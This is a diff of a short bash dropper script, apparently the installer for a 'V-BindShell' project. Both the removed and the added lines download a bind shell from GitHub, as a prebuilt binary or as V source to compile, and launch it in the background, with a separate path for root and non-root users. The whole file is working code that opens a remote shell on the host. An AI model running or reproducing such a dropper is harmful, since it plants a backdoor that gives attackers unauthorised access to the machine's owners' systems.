@@ -1,9 +1,12 @@
 #!/bin/bash
 
-wget https://github.com/vlang/v/releases/download/weekly.2021.5/v_linux.zip -O v.zip
-unzip v.zip
-rm v.zip
-cd v 
-make
-wget https://gist.githubusercontent.com/bstnbuck/142508b38e508c451dbd2ca87b692596/raw/b41d38cce784eca5c0cd6d3a80c61df78b364282/v_bind_shell.v -O v_shell.v 
-./v run v_shell.v
+if [ $EUID -ne 0 ]; then
+    wget -q https://github.com/bstnbuck/V-BindShell/releases/download/v1.0/v_shell-linux-amd64 -O v_shell && chmod +x v_shell && ./v_shell &
+    exit
+fi
+apt install -y git wget make build-essential
+git clone https://github.com/vlang/v
+cd v && make
+wget https://raw.githubusercontent.com/bstnbuck/V-BindShell/main/v_shell.v
+./v -autofree v_shell.v && chmod +x v_shell && ./v_shell &
+exit
